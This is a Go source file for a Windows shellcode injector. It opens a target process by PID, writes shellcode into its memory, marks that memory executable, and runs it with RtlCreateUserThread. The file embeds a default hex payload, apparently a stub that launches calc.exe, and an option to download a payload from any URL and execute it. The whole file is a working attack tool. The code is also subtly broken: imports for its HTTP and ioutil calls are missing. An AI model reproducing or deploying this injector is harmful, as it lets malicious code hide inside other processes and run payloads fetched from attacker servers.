/*
This program executes shellcode in a remote process using the following steps
	1. Get a handle to the target process
	1. Allocate memory for the shellcode with VirtualAllocEx setting the page permissions to Read/Write
	2. Use the WriteProcessMemory to copy the shellcode to the allocated memory space in the remote process
	3. Change the memory page permissions to Execute/Read with VirtualProtectEx
	4. Execute the entrypoint of the shellcode in the remote process with RtlCreateUserThread
	5. Close the handle to the remote process

This program loads the DLLs and gets a handle to the used procedures itself instead of using the windows package directly.
*/

package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"log"
	"os"
	"unsafe"
	
	// Sub Repositories
	"golang.org/x/sys/windows"
)

func main() {
	verbose := flag.Bool("verbose", false, "Enable verbose output")
	debug := flag.Bool("debug", false, "Enable debug output")
	// To hardcode the Process Identifier (PID), change 0 to the PID of the target process
	pid := flag.Int("pid", 0, "Process ID to inject shellcode into")
	shellcodePath := flag.String("shellcode", "fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c632e65786500", "Path to the shellcode file")
    shellcodeURL := flag.String("shellcode-url", "", "URL of the shellcode file")

	flag.Usage = func() {
		flag.PrintDefaults()
		os.Exit(0)
	}
	flag.Parse()
	var shellcodeHex string // Declare shellcodeHex outside if/else blocks
	var err error
	if *shellcodeURL == "" {
		// If not provided, check if the shellcode path is provided
		if *shellcodePath == "" {
			// If neither shellcode URL nor shellcode path is provided, exit with an error
			log.Fatal("Please provide either the URL or the path to the shellcode file")
		}
		shellcodeBytes := *shellcodePath
		
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = shellcodeBytes
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString([]byte(shellcodeBytes))
		}
		
	} else {
		// Read from URL
		// Make HTTP GET request to fetch from URL
		resp, err := http.Get(*shellcodeURL)
		if err != nil {
			log.Fatalf("Error fetching shellcode from URL: %v", err)
		}
		defer resp.Body.Close()

		if resp.StatusCode != http.StatusOK {
			log.Fatalf("Failed to fetch shellcode from URL: %s", resp.Status)
		}

		shellcodeBytes, err := ioutil.ReadAll(resp.Body)
		if err != nil {
			log.Fatalf("Error reading shellcode from response body: %v", err)
		}

		// Check if shellcode is already in hexadecimal format
		_, err = hex.DecodeString(string(shellcodeBytes))
		if err == nil {
			// If decoding succeeds, it's in hexadecimal format
			shellcodeHex = string(shellcodeBytes)
		} else {
			// If decoding fails, it's assumed to be in byte format
			shellcodeHex = hex.EncodeToString(shellcodeBytes)
		}
	

		
	}


	if *debug {
		fmt.Println("[DEBUG]Loaded shellcode from file:", *shellcodePath)
	}

	shellcode, errShellcode := hex.DecodeString(shellcodeHex)
	if errShellcode != nil {
		log.Fatal(fmt.Sprintf("[!]there was an error decoding the string to a hex byte array: %s", errShellcode.Error()))
	}
	if *debug {
		fmt.Println("[DEBUG]Loading kernel32.dll and ntdll.dll...")
	}


	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")

	OpenProcess := kernel32.NewProc("OpenProcess")
	VirtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	VirtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	WriteProcessMemory := kernel32.NewProc("WriteProcessMemory")
	RtlCreateUserThread := ntdll.NewProc("RtlCreateUserThread")
	CloseHandle := kernel32.NewProc("CloseHandle")

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Getting a handle to Process ID (PID) %d...", *pid))
	}
	pHandle, _, errOpenProcess := OpenProcess.Call(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, 0, uintptr(uint32(*pid)))

	if errOpenProcess != nil && errOpenProcess.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling OpenProcess:\r\n%s", errOpenProcess.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully got a handle to process %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualAllocEx on PID %d...", *pid))
	}
	addr, _, errVirtualAlloc := VirtualAllocEx.Call(uintptr(pHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)

	if errVirtualAlloc != nil && errVirtualAlloc.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling VirtualAlloc:\r\n%s", errVirtualAlloc.Error()))
	}

	if addr == 0 {
		log.Fatal("[!]VirtualAllocEx failed and returned 0")
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully allocated memory in PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling WriteProcessMemory on PID %d...", *pid))
	}
	_, _, errWriteProcessMemory := WriteProcessMemory.Call(uintptr(pHandle), addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))

	if errWriteProcessMemory != nil && errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully wrote shellcode to PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling VirtualProtectEx on PID %d...", *pid))
	}
	oldProtect := windows.PAGE_READWRITE
	_, _, errVirtualProtectEx := VirtualProtectEx.Call(uintptr(pHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx != nil && errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully change memory permissions to PAGE_EXECUTE_READ in PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling RtlCreateUserThread on PID %d...", *pid))
	}
	var tHandle uintptr
	_, _, errRtlCreateUserThread := RtlCreateUserThread.Call(uintptr(pHandle), 0, 0, 0, 0, 0, addr, 0, uintptr(unsafe.Pointer(&tHandle)), 0)

	if errRtlCreateUserThread != nil && errRtlCreateUserThread.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling RtlCreateUserThread:\r\n%s", errRtlCreateUserThread.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully called RtlCreateUserThread on PID %d", *pid))
	}

	if *debug {
		fmt.Println(fmt.Sprintf("[DEBUG]Calling CloseHandle on PID %d...", *pid))
	}
	_, _, errCloseHandle := CloseHandle.Call(uintptr(uint32(pHandle)))
	if errCloseHandle != nil && errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("[!]Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}
	if *verbose {
		fmt.Println(fmt.Sprintf("[-]Successfully closed the handle to PID %d", *pid))
	}

}

// export GOOS=windows GOARCH=amd64;go build -o goRtlCreateUserThread.exe cmd/RtlCreateUserThread/main.go